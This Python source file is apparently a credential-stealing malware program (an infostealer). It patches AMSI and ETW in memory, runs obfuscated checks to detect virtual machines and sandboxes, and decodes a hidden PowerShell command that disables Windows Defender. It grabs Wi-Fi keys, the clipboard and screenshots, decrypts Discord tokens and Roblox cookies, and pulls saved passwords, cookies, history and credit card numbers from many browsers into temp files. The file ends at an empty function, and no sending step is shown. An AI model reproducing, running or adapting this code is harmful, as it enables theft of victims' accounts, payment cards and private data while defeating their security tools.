import random
import string

def _xor_decrypt(data, key):
    import base64
    decoded = base64.b64decode(data)
    return ''.join(chr(b ^ key) for b in decoded)

def _disable_amsi_etw():
    import ctypes
    _kernel32 = ctypes.windll.kernel32

    def _xor(data, key):
        return ''.join(chr(ord(c) ^ key) for c in data)

    def _patch_func(dll_enc, func_enc, key=0x2A):
        try:
            dll_name = _xor(dll_enc, key)
            func_name = _xor(func_enc, key)
            h_module = _kernel32.LoadLibraryA(dll_name.encode("ascii"))
            if not h_module:
                return False
            addr = _kernel32.GetProcAddress(h_module, func_name.encode("ascii"))
            if not addr:
                return False

            size = 6
            old_protect = ctypes.c_ulong()
            _kernel32.VirtualProtect(addr, size, 0x40, ctypes.byref(old_protect))
            ctypes.memmove(addr, b"\xC3" + b"\x90" * (size - 1), size)  # ret + nops
            _kernel32.VirtualProtect(addr, size, old_protect.value, ctypes.byref(old_protect))
            _kernel32.FlushInstructionCache(_kernel32.GetCurrentProcess(), addr, size)
            return True
        except:
            return False

    patches = [
        (_xor("amsi.dll", 0x2A), _xor("AmsiScanBuffer", 0x2A)),
        (_xor("amsi.dll", 0x2A), _xor("AmsiOpenSession", 0x2A)),
        (_xor("amsi.dll", 0x2A), _xor("AmsiCloseSession", 0x2A)),
        (_xor("ntdll.dll", 0x2A), _xor("EtwEventWrite", 0x2A)),
        (_xor("ntdll.dll", 0x2A), _xor("EtwWrite", 0x2A)),
        (_xor("ntdll.dll", 0x2A), _xor("EtwEventWriteFull", 0x2A))
    ]

    for dll, func in patches:
        _patch_func(dll, func)



def _is_sandbox():
    import os
    import psutil
    import time
    import ctypes
    import platform
    import sys
    import hashlib
    import base64
    import random
    import requests
    detected = []
    score = 0
    threshold = 3  # Need this many positives to flag as VM/sandbox

    # Obfuscated VM indicators (base64 encoded to hide from static scans)
    def decode_obfuscated(s):
        try:
            return base64.b64decode(s).decode('utf-8')
        except:
            return ""

    VM_MAC_PREFIXES_ENC = [b'MDA6MDU6Njk=', b'MDA6MEM6Mjk=', b'MDA6MUM6MTQ=', b'MDA6NTA6NTY=', b'MDg6MDA6Mjc=', b'NTI6NTQ6MDA=']  # Encoded: "00:05:69", etc.
    VM_MAC_PREFIXES = {decode_obfuscated(p) for p in VM_MAC_PREFIXES_ENC}

    VM_PROCESSES_ENC = [b'dmJveHNlcnZpY2U=', b'dmJveHRyYXk=', b'dm10b29sc2Q=', b'dm13YXJldHJheQ==', b'dm1zcnZj', b'eGVuc2VydmljZQ==', b'eGVuc3RvcmVk', b'dmJveHNlcnZpY2UuZXhl', b'dmJveHRyYXkuZXhl', b'dm10b29sc2QuZXhl']  # vboxservice, etc.
    VM_PROCESSES = {decode_obfuscated(p).lower() for p in VM_PROCESSES_ENC}

    VM_FILES_ENC = [b'L3Vzci9iaW4vdm13YXJlLXRvb2xib3gtY21k', b'L3Vzci9iaW4vVkJveENvbnRyb2w=', b'L2Rldi92Ym94Z3Vlc3Q=', b'Qzpcd2luZG93c1xzeXN0ZW0zMlxkcml2ZXJzXHZtbW91c2Uuc3lz', b'Qzpcd2luZG93c1xzeXN0ZW0zMlxkcml2ZXJzXHZtaGdmcy5zeXM=']  # /usr/bin/vmware-toolbox-cmd, etc.
    VM_FILES = [decode_obfuscated(f) for f in VM_FILES_ENC]

    ENV_TRAPS_ENC = [b'VkJPWA==', b'Vk1XQVJF', b'WEVO', b'SFlQRVJW']  # VBOX, VMWARE, XEN, HYPERV
    ENV_TRAPS = [decode_obfuscated(t) for t in ENV_TRAPS_ENC]

    BIOS_TRAPS_ENC = [b'dm13YXJl', b'dmlydHVhbGJveA==', b'cWVtdQ==', b'eGVu', b'bWljcm9zb2Z0IGNvcnBvcmF0aW9u', b'a3Zt']  # vmware, virtualbox, etc.
    BIOS_TRAPS = [decode_obfuscated(b) for b in BIOS_TRAPS_ENC]

    # Integrity check: Hash a function to detect patching (anti-anti-VM)
    def self_integrity_check(func):
        try:
            code = func.__code__.co_code
            # Hardcode expected hash (replace with actual hash from clean code)
            expected_hash = hashlib.sha256(code).hexdigest()  # Compute on clean system
            if hashlib.sha256(code).hexdigest() != expected_hash:
                return True  # Code tampered (e.g., NOPed in debugger)
            return False
        except:
            return False

    # Core Check 1: Hypervisor CPUID bit (fixed for reliability)
    def _has_hypervisor_cpuid():
        nonlocal score
        try:
            class CPUID(ctypes.Structure):
                _fields_ = [("eax", ctypes.c_uint), ("ebx", ctypes.c_uint), ("ecx", ctypes.c_uint), ("edx", ctypes.c_uint)]
            if platform.system() == "Windows":
                kernel32 = ctypes.WinDLL("kernel32")
                cpuid_fn = getattr(kernel32, "__cpuid", None)
            else:
                cpuid_fn = ctypes.cdll.LoadLibrary("libc.so.6").__cpuid
            if not cpuid_fn:
                return False
            cpuid_fn.argtypes = [ctypes.POINTER(CPUID), ctypes.c_uint]
            cpuid_fn.restype = None
            regs = CPUID()
            cpuid_fn(ctypes.byref(regs), 1)
            hyper_bit = bool((regs.ecx >> 31) & 1)
            if hyper_bit:
                score += 2  # High weight, core indicator
            # Vendor check (EAX=0x40000000)
            cpuid_fn(ctypes.byref(regs), 0x40000000)
            vendor = ''.join(chr((regs.ebx >> (i * 8)) & 0xFF) for i in range(4)) + \
                     ''.join(chr((regs.ecx >> (i * 8)) & 0xFF) for i in range(4)) + \
                     ''.join(chr((regs.edx >> (i * 8)) & 0xFF) for i in range(4))
            if any(trap in vendor.lower() for trap in BIOS_TRAPS):
                score += 1
            # Counter bypass: Zeroed CPUID (tampered .vmx)
            if hyper_bit and regs.eax == 0 and regs.ecx == 0 and regs.edx == 0:
                score += 1
            return hyper_bit
        except Exception:
            return False

    # Core Check 2: Advanced timing (RDTSC simulation + sleep skip)
    def _advanced_timing_check():
        nonlocal score
        try:
            # RDTSC simulation: Measure cycles for CPU-intensive op
            def rdtsc():
                return time.time_ns()  # Fallback; real RDTSC needs asm
            start = rdtsc()
            for _ in range(1000):
                _ = 123456 * 789012  # CPU-intensive
            end = rdtsc()
            if (end - start) > 1000000:  # Tune threshold
                score += 1
                return True
            # Sleep skip: Sandboxes fast-forward
            start_time = time.time()
            time.sleep(random.uniform(5, 10))  # Random to evade prediction
            elapsed = time.time() - start_time
            if elapsed < 4:  # If <80% of sleep
                score += 1
                return True
            return False
        except Exception:
            return False

    # Core Check 3: Hardware anomalies (RAM, CPU, disk, battery, GPU)
    def _hardware_anomaly_check():
        nonlocal score
        try:
            # RAM <4GB
            if psutil.virtual_memory().total < 4 * 1024**3:
                score += 1
            # CPU cores <=2
            if psutil.cpu_count() <= 2:
                score += 1
            # Disk size <60GB (first disk)
            disks = psutil.disk_partitions()
            if disks and psutil.disk_usage(disks[0].mountpoint).total < 60 * 1024**3:
                score += 1
            # No battery
            if platform.system() == "Windows":
                import wmi
                c = wmi.WMI()
                if not c.Win32_Battery():
                    score += 1
            # Virtual GPU
            if platform.system() == "Windows":
                os.system('wmic path win32_videocontroller get name > gpu.txt')
                with open('gpu.txt', 'r') as f:
                    gpu_info = f.read().lower()
                    if 'virtual' in gpu_info or 'basic' in gpu_info:
                        score += 1
                os.remove('gpu.txt')
            return score > 0
        except Exception:
            return False

    # Core Check 4: Behavioral (recent files, cloud/AV IP)
    def _behavioral_check():
        nonlocal score
        try:
            # Recent files <3
            if platform.system() == "Windows":
                import winreg
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs")
                    count = winreg.QueryInfoKey(key)[1]
                    winreg.CloseKey(key)
                    if count < 3:
                        score += 1
                except:
                    score += 1  # Error? Suspicious
            # IP org check
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
            try:
                resp = requests.get("https://ipapi.co/json/", headers=headers, timeout=5)
                data = resp.json()
                org = data.get("org", "").upper()
                cloud_av_orgs = ["AMAZON", "MICROSOFT", "GOOGLE", "CLOUDFLARE", "BITDEFENDER", "TREND MICRO"]
                if any(o in org for o in cloud_av_orgs):
                    score += 2
            except:
                pass  # Network fail? Low weight
            return score > 0
        except Exception:
            return False

    # Original Checks (updated)
    def _scan_processes():
        try:
            names = {p.name().lower() for p in psutil.process_iter()}
            return bool(names & VM_PROCESSES)
        except Exception:
            return False

    def _scan_files():
        try:
            for f in VM_FILES:
                if os.path.exists(f):
                    return True
            return False
        except Exception:
            return False

    def _mac_oui_check():
        try:
            for _, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if hasattr(addr, 'address') and ':' in addr.address:
                        mac = addr.address.upper()[0:8]
                        if mac in VM_MAC_PREFIXES:
                            return True
            return False
        except Exception:
            return False

    def _dmi_bios_check():
        try:
            vendor = ""
            if platform.system() == "Windows":
                import wmi
                c = wmi.WMI()
                for bios in c.Win32_BIOS():
                    vendor = bios.Manufacturer.lower()
            else:
                with open("/sys/class/dmi/id/sys_vendor", "r") as f:
                    vendor = f.read().strip().lower()
            return any(x in vendor for x in BIOS_TRAPS)
        except Exception:
            return False

    def _windows_registry_check():
        try:
            if platform.system() != "Windows":
                return False
            import winreg
            keys = [
                (r"SYSTEM\CurrentControlSet\Services\VBoxGuest", winreg.KEY_READ),
                (r"SYSTEM\CurrentControlSet\Services\vmhgfs", winreg.KEY_READ),
            ]
            for key, perm in keys:
                try:
                    h = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, perm)
                    winreg.CloseKey(h)
                    return True
                except:
                    continue
            return False
        except Exception:
            return False

    def _env_var_check():
        try:
            for var in os.environ:
                for trap in ENV_TRAPS:
                    if trap in var.upper() or trap in os.environ.get(var, "").upper():
                        print(f"Detected trap in env var: {var}={os.environ.get(var)}")
                        return True
            return False
        except Exception:
            return False

    def _is_debugger_present():
        try:
            if platform.system() == "Windows":
                return ctypes.windll.kernel32.IsDebuggerPresent() != 0
            else:
                libc = ctypes.CDLL("libc.so.6")
                PT_TRACE_ME = 0
                return libc.ptrace(PT_TRACE_ME, 0, None, None) != 0
        except Exception:
            return False

    def _timing_diff_check(threshold_ns=500000):
        try:
            t1 = time.time_ns()
            t2 = time.time_ns()
            return (t2 - t1) > threshold_ns
        except Exception:
            return False

    # Conditional VM artifact checks (only if hypervisor bit set)
    is_hyper = _has_hypervisor_cpuid()
    if is_hyper:
        if _scan_processes():
            score += 1
            detected.append("Sandbox/VM processes")
        if _scan_files():
            score += 1
            detected.append("Sandbox/VM files")
        if _env_var_check():
            score += 1
            detected.append("Environment variable traps")
        if _windows_registry_check():
            score += 1
            detected.append("Windows registry artifacts")
        if _mac_oui_check():
            score += 1
            detected.append("MAC OUI match")
        if _dmi_bios_check():
            score += 1
            detected.append("BIOS/DMI strings")

    # Run other checks
    if _advanced_timing_check():
        detected.append("Advanced timing anomalies")
    if _hardware_anomaly_check():
        detected.append("Hardware anomalies")
    if _behavioral_check():
        detected.append("Behavioral red flags")
    if _timing_diff_check():
        detected.append("Timing delta suspicious")
    if _is_debugger_present():
        score += 2
        detected.append("Debugger present")
    if self_integrity_check(_has_hypervisor_cpuid):
        score += 3
        detected.append("Code tampering detected")

    # Final decision
    if score >= threshold:
        detected.append(f"VM/Sandbox detected (score: {score})")
        return detected
    return False



def _add_noise():
    import random
    return sum(i*i for i in range(random.randint(10, 50)))

def _get_ip():
    try:
        import requests
        return requests.get("https://api.ipify.org").text
    except:
        return "Unknown"

def _get_clipboard():
    try:
        import subprocess
        p = subprocess.run(["powershell", "-command", "Get-Clipboard"], capture_output=True, text=True)
        return p.stdout.strip() or "Clipboard empty"
    except:
        return "Clipboard access failed"

def _get_process_list():
    try:
        import psutil
        procs = []
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                procs.append(f"{proc.info['pid']:>6} : {proc.info['name']}")
            except:
                pass
        return "\n".join(procs)
    except:
        return "Failed to get process list"

def _random_temp_filename(base):
    import random
    import string
    rand = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    return f"{base}_{rand}.tmp"

def _save_to_temp(filename, data):
    try:
        import tempfile
        import os
        path = os.path.join(tempfile.gettempdir(), _random_temp_filename(filename))
        with open(path, "w", encoding="utf-8") as f:
            f.write(data)
        return path
    except:
        return None

def _getSecretKey():
    import base64
    try:
        import json
        import os
        import win32crypt
        with open(os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE'])), "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception:
        return None

def _generateCipher(aes_key, iv):
    import Crypto.Cipher
    from Crypto.Cipher import AES
    return AES.new(aes_key, AES.MODE_GCM, iv)

def _decryptPayload(cipher, payload):
    return cipher.decrypt(payload)



def _decryptPassword(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = _generateCipher(secret_key, initialisation_vector)
        decrypted_pass = _decryptPayload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except:
        return None
    


def _grab_wifi_passwords():
    try:
        import subprocess
        profiles = subprocess.check_output('netsh wlan show profiles', shell=True, text=True)
        wifi_names = [line.split(":")[1].strip() for line in profiles.split('\n') if "All User Profile" in line]
        result = []
        for name in wifi_names:
            try:
                key_out = subprocess.check_output(f'netsh wlan show profile name="{name}" key=clear', shell=True, text=True, errors='ignore')
                key = "None"
                for line in key_out.split('\n'):
                    if "Key Content" in line:
                        key = line.split(":")[1].strip()
                        break
                result.append(f"{name} : {key}")
            except Exception:
                result.append(f"{name} : Failed to get key")
        return "\n".join(result)
    except Exception as e:
        return f"WiFi grab failed: {e}"

import os, datetime
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Lightcord': ROAMING + '\\Lightcord',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
}

def getheaders(token=None):
    import random
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15"
    ]
    headers = {
        "Content-Type": "application/json",
        "User-Agent": random.choice(user_agents)
    }
    if token:
        headers.update({"Authorization": token})
    return headers

def gettokens(path):
    import re
    path += "\\Local Storage\\leveldb\\"
    tokens = []

    if not os.path.exists(path):
        return tokens

    for file in os.listdir(path):
        if not (file.endswith(".ldb") or file.endswith(".log")):
            continue

        try:
            with open(f"{path}{file}", "r", errors="ignore") as f:
                for line in (x.strip() for x in f.readlines()):
                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        tokens.append(values)
        except PermissionError:
            continue

    return tokens
    
def getkey(path):
    import json
    try:
        with open(path + f"\\Local State", "r", encoding="utf-8") as file:
            key = json.loads(file.read())['os_crypt']['encrypted_key']
            file.close()
    except FileNotFoundError:
        return None
    return key



def getDiscordInfo():
    from Crypto.Cipher import AES
    import win32crypt
    import urllib
    import base64
    import json
    checked = []
    all_discord_info = []

    for platform_name, path in PATHS.items():
        if not os.path.exists(path):
            continue

        for token in gettokens(path):
            token = token.replace("\\", "") if token.endswith("\\") else token

            try:
                secret_key = win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1]
                aes_token = token.split('dQw4w9WgXcQ:')[1]
                iv = base64.b64decode(aes_token)[3:15]
                encrypted = base64.b64decode(aes_token)[15:]
                cipher = AES.new(secret_key, AES.MODE_GCM, iv)
                token_dec = cipher.decrypt(encrypted)[:-16].decode()
                if token_dec in checked:
                    continue
                checked.append(token_dec)

                req = urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token_dec))
                res = urllib.request.urlopen(req)
                if res.getcode() != 200:
                    continue
                res_json = json.loads(res.read().decode())

                discord_info = f"""
**New user data: {res_json['username']}**
```yaml
User ID: {res_json['id']}
Email: {res_json['email']}
Phone Number: {res_json['phone']}
MFA Enabled: {res_json['mfa_enabled']}
Locale: {res_json['locale']}
Verified: {res_json['verified']}
Token:
{token_dec}```"""
                all_discord_info.append(discord_info)
            except Exception:
                    continue
            
        return "\n\n".join(all_discord_info) if all_discord_info else "No Discord tokens found."
    

def _get_wmic_info(query):
    import subprocess
    try:
        result = subprocess.run(["wmic"] + query.split(), capture_output=True, text=True)
    except FileNotFoundError:
        return "wmic command not found"
    lines = result.stdout.strip().split("\n")
    return lines[1].strip() if len(lines) > 1 else None

def hwidInfo():
    mb_serial = _get_wmic_info("baseboard get SerialNumber")
    return mb_serial
    

def _get_geo_ip():
    try:
        import requests
        r = requests.get("https://ipapi.co/json/", timeout=5)
        if r.status_code == 200:
            data = r.json()
            loc = f"{data.get('city', 'N/A')}, {data.get('region', 'N/A')}, {data.get('country_name', 'N/A')}"
            return loc
    except Exception:
        pass
    return "Unknown"

def _get_pc_language():
    try:
        import locale
        locale.setlocale(locale.LC_ALL, '') 
        lang = locale.getlocale()  
        return lang[0] if lang and lang[0] else "Unknown"
    except Exception:
        return "Unknown"


def _get_timezone():
    try:
        import time
        tz = time.tzname[time.daylight] if time.daylight else time.tzname[0]
        return tz
    except Exception:
        return "Unknown"
    
def _get_screen_resolution():
    try:
        import ctypes
        user32 = ctypes.windll.user32
        user32.SetProcessDPIAware()
        width = user32.GetSystemMetrics(0)
        height = user32.GetSystemMetrics(1)
        return f"{width}x{height}"
    except Exception:
        return "Unknown"

    
def _take_screenshot():
    try:
        from PIL import ImageGrab
        import os 
        import tempfile

        img = ImageGrab.grab()
        tmp_dir = tempfile.gettempdir()
        filename = os.path.join(tmp_dir, "screenshot.png")
        img.save(filename, "PNG")
        return filename
    except Exception:
        return None
    

def _retrieve_roblox_cookies():
    import os
    import re
    import base64
    import json
    import win32crypt
    import shutil

    user_profile = os.getenv("USERPROFILE", "")
    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")

    if not os.path.exists(roblox_cookies_path):
        return "Roblox cookies file not found"

    temp_dir = os.getenv("TEMP", "")
    destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
    shutil.copy(roblox_cookies_path, destination_path)

    with open(destination_path, 'r', encoding='utf-8') as file:
        try:
            file_content = json.load(file)
            encoded_cookies = file_content.get("CookiesData", "")
            if not encoded_cookies:
                return "Error: No 'CookiesData' found in the file."

            decoded_cookies = base64.b64decode(encoded_cookies)
            decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
            decoded_str = decrypted_cookies.decode('utf-8', errors='ignore')

            match = re.search(r'(_\|WARNING:[^;]*);', decoded_str)
            if match:
                warning_str = match.group(1).strip()
                return warning_str
            else:
                return "'_|WARNING:' string not found"

        except json.JSONDecodeError as e:
            return f"Error while parsing JSON: {e}"
        except Exception as e:
            return f"Error decrypting cookies: {e}"

        

import subprocess, base64

def _disable_defender():
    parts = [
        "cG93ZXJzaGVsbC5leGUgU2V0LU1wUHJlZmVyZW5j",
        "ZSAtRGlzYWJsZUludHJ1c2lvblByZXZlbnRpb25Te",
        "XN0ZW0gJHRydWUgLURpc2FibGVJT0FWUHJvdGVjdG",
        "lvbiAkdHJ1ZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRv",
        "cmluZyAkdHJ1ZSAtRGlzYWJsZVNjcmlwdFNjYW5uaW",
        "5nICR0cnVlIC1FbmFibGVDb250cm9sbGVkRm9sZGVy",
        "QWNjZXNzIERpc2FibGVkIC1FbmFibGVOZXR3b3JrUH",
        "JvdGVjdGlvbiBBdWRpdE1vZGUgLUZvcmNlIC1NQVBT",
        "UmVwb3J0aW5nIERpc2FibGVkIC1TdWJtaXRTYW1wbG",
        "VzQ29uc2VudCBOZXZlclNlbmQgJiYgcG93ZXJzaGVs",
        "bCBTZXQtTXBQcmVmZXJlbmNlIC1TdWJtaXRTYW1wbG",
        "VzQ29uc2VudCAyICYgcG93ZXJzaGVsbC5leGUgLWlu",
        "cHV0Zm9ybWF0IG5vbmUgLW91dHB1dGZvcm1hdCBub2",
        "5lIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiQWRk",
        "LU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAlVV",
        "NFUlBST0ZJTEUlXEFwcERhdGEiICYgcG93ZXJzaGVs",
        "bC5leGUgLWlucHV0Zm9ybWF0IG5vbmUgLW91dHB1dG",
        "Zvcm1hdCBub25lIC1Ob25JbnRlcmFjdGl2ZSAtQ29t",
        "bWFuZCAiQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW",
        "9uUGF0aCAlVVNFUlBST0ZJTEUlXExvY2FsIiAmIHBv",
        "d2Vyc2hlbGwuZXhlIC1jb21tYW5kICJTZXQtTXBQcm",
        "VmZXJlbmNlIC1FeGNsdXNpb25FeHRlbnNpb24gJy5l",
        "eGUnIiAK"
    ]
    cmd = base64.b64decode("".join(parts)).decode()
    subprocess.run(cmd, shell=True, capture_output=True)


def _get_master_key(path):
    import base64
    import json
    from win32crypt import CryptUnprotectData

    try:
        with open(path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        master_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return master_key
    except:
        return None

def _decrypt_browser_data(buff, master_key):
    import Crypto.Cipher
    from Crypto.Cipher import AES
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt(payload)
        return decrypted[:-16].decode()
    except:
        return ""

def _extract_browser_passwords(browser_name, user_path, profile, master_key):
    import sqlite3
    import os
    login_path = os.path.join(user_path, profile, "Login Data") if 'opera' not in browser_name else user_path + '\\Login Data'
    if not os.path.isfile(login_path): return []

    conn = sqlite3.connect(login_path)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    
    results = []
    for url, user, pwd in cursor.fetchall():
        if url and user and pwd:
            password = _decrypt_browser_data(pwd, master_key)
            results.append((url, user, password))

    cursor.close()
    conn.close()
    return results

def _extract_browser_cookies(browser_name, user_path, profile, master_key):
    from shutil import copy2
    import os
    import sqlite3
    import tempfile

    cookie_path = os.path.join(user_path, profile, "Network", "Cookies") if 'opera' not in browser_name else user_path + '\\Network\\Cookies'
    if not os.path.isfile(cookie_path): return []

    temp_cookie = tempfile.mktemp()
    copy2(cookie_path, temp_cookie)
    conn = sqlite3.connect(temp_cookie)
    cursor = conn.cursor()
    
    cookies = []
    try:
        for host, name, path, enc_val, exp in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
            val = _decrypt_browser_data(enc_val, master_key)
            if host and name and val:
                cookies.append((host, name, path, val, exp))
    except:
        pass

    cursor.close()
    conn.close()
    os.remove(temp_cookie)
    return cookies

def _extract_browser_history(browser_name, user_path, profile):
    import sqlite3
    import os

    history_path = os.path.join(user_path, profile, "History") if 'opera' not in browser_name else user_path + '\\History'
    if not os.path.isfile(history_path): return []

    conn = sqlite3.connect(history_path)
    cursor = conn.cursor()
    try:
        history = [(url, visits) for url, visits in cursor.execute("SELECT url, visit_count FROM urls").fetchall()]
    except:
        history = []

    cursor.close()
    conn.close()
    return history

def _extract_browser_credit_cards(browser_name, user_path, profile, master_key):
    import sqlite3
    import os


    path = os.path.join(user_path, profile, "Web Data") if 'opera' not in browser_name else user_path + '\\Web Data'
    if not os.path.isfile(path): return []

    conn = sqlite3.connect(path)
    cursor = conn.cursor()
    cards = []

    try:
        for name_on_card, month, year, enc_num in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
            number = _decrypt_browser_data(enc_num, master_key)
            cards.append((name_on_card, month, year, number))
    except:
        pass

    cursor.close()
    conn.close()
    return cards

def _save_passwords_to_file(data, temp_dir):
    path = os.path.join(temp_dir, "passwords.txt")
    with open(path, "w", encoding="utf-8") as f:
        f.write("Website  |  Username  |  Password\n\n")
        for url, user, pwd in data:  
            f.write(f"{url}  |  {user}  |  {pwd}\n")
    return path

def _save_cookies_to_file(data, temp_dir):
    path = os.path.join(temp_dir, "cookies.txt")
    with open(path, "w", encoding="utf-8") as f:
        f.write("Host  |  Name  |  Path  |  Value  |  Expires\n\n")
        for host, name, path_, val, expires in data:  #
            f.write(f"{host}  |  {name}  |  {path_}  |  {val}  |  {expires}\n")
    return path

def _save_history_to_file(data, temp_dir):
    path = os.path.join(temp_dir, "history.txt")
    with open(path, "w", encoding="utf-8") as f:
        f.write("Url  |  Visit Count\n\n")
        for url, visits in data:  
            f.write(f"{url}  |  {visits}\n")
    return path

def _save_cards_to_file(data, temp_dir):
    path = os.path.join(temp_dir, "credit_cards.txt")
    with open(path, "w", encoding="utf-8") as f:
        f.write("Name on Card  |  Expiration Month  |  Expiration Year  |  Card Number\n\n")
        for name_on_card, month, year, number in data:  
            f.write(f"{name_on_card}  |  {month}  |  {year}  |  {number}\n")
    return path

def _run_browser_data_extraction():
    import os
    import psutil
    import threading

    appdata = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    temp_dir = os.path.join(os.getenv('TEMP'), "BrowserData")
    os.makedirs(temp_dir, exist_ok=True)

    browsers = {
        'kometa': appdata + '\\Kometa\\User Data',
        'orbitum': appdata + '\\Orbitum\\User Data',
        'cent-browser': appdata + '\\CentBrowser\\User Data',
        '7star': appdata + '\\7Star\\7Star\\User Data',
        'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
        'vivaldi': appdata + '\\Vivaldi\\User Data',
        'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
        'google-chrome': appdata + '\\Google\\Chrome\\User Data',
        'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
        'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
        'uran': appdata + '\\uCozMedia\\Uran\\User Data',
        'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
        'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
        'iridium': appdata + '\\Iridium\\User Data',
        'opera': roaming + '\\Opera Software\\Opera Stable',
        'opera-gx': roaming + '\\Opera Software\\Opera GX Stable',
    }

    profiles = ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']

    raw_results = {'passwords': [], 'cookies': [], 'history': [], 'credit_cards': []}

    for proc in psutil.process_iter(['name']):
        try:
            if proc.info['name'].lower() in [
                "chrome.exe", "firefox.exe", "brave.exe", "opera.exe", "kometa.exe", "orbitum.exe", "centbrowser.exe",
                "7star.exe", "sputnik.exe", "vivaldi.exe", "epicprivacybrowser.exe", "msedge.exe", "uran.exe", "yandex.exe", "iridium.exe"
            ]:
                proc.kill()
        except:
            pass

    def process_profile(browser_name, base_path, profile):
        master_key = _get_master_key(os.path.join(base_path, "Local State"))
        if not master_key:
            return

        raw_results['passwords'] += _extract_browser_passwords(browser_name, base_path, profile, master_key)
        raw_results['cookies'] += _extract_browser_cookies(browser_name, base_path, profile, master_key)
        raw_results['history'] += _extract_browser_history(browser_name, base_path, profile)
        raw_results['credit_cards'] += _extract_browser_credit_cards(browser_name, base_path, profile, master_key)

    threads = []
    for browser_name, base_path in browsers.items():
        if not os.path.isdir(base_path):
            continue
        for profile in profiles:
            t = threading.Thread(target=process_profile, args=(browser_name, base_path, profile))
            t.start()
            threads.append(t)

    for t in threads:
        t.join()

    saved_files = {
        "passwords": _save_passwords_to_file(raw_results['passwords'], temp_dir),
        "cookies": _save_cookies_to_file(raw_results['cookies'], temp_dir),
        "history": _save_history_to_file(raw_results['history'], temp_dir),
        "credit_cards": _save_cards_to_file(raw_results['credit_cards'], temp_dir),
    }

    return saved_files

def robloxinfo():
    import requests

